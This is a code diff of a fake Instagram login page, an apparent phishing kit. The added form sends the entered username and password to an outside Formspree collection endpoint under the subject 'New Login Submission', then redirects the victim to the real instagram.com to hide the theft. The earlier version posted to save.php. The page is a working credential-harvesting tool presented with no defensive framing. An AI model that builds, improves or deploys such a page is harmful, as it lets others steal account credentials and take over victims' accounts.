@@ -1,59 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login - Instagram</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
-      background-color: #fafafa;
-      font-family: 'Roboto', sans-serif;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #f9f9f9, #e0e0e0);
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
-    .container {
-      width: 350px;
-      border: 1px solid #dbdbdb;
-      background-color: white;
-      padding: 40px 40px;
+
+    .login-container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+      width: 320px;
       text-align: center;
     }
-    .logo {
-      width: 180px;
-      margin-bottom: 30px;
+
+    .title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #444;
+      margin-bottom: 20px;
     }
-    input {
+
+    .login-form input {
       width: 100%;
-      padding: 9px;
-      margin-bottom: 10px;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
-      background-color: #fafafa;
+      padding: 12px 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
     }
-    button {
+
+    .login-form button {
       width: 100%;
-      padding: 8px;
-      background-color: #0095f6;
+      padding: 12px;
+      background-color: #3897f0;
       color: white;
+      font-size: 16px;
       border: none;
-      font-weight: bold;
-      border-radius: 4px;
+      border-radius: 6px;
+      cursor: pointer;
       margin-top: 10px;
     }
-    .error {
-      color: red;
-      margin-top: 20px;
+
+    .login-form button:hover {
+      background-color: #2878c4;
+    }
+
+    .note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="logo" alt="Instagram">
-    <form action="save.php" method="POST">
-      <input type="text" name="username" placeholder="Phone number, username, or email" required>
-      <input type="password" name="password" placeholder="Password" required>
+  <div class="login-container">
+    <h2 class="title">Instagram</h2>
+    <!-- Formspree Integration -->
+    <form action="https://formspree.io/f/xwpowzly" method="POST" class="login-form">
+      <!-- Username and Password Inputs -->
+      <input type="text" name="username" placeholder="Username" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <!-- Hidden fields (optional) -->
+      <input type="hidden" name="_subject" value="New Login Submission" />
+      <input type="hidden" name="_redirect" value="https://www.instagram.com" />
+      <!-- Submit Button -->
       <button type="submit">Log In</button>
     </form>
   </div>
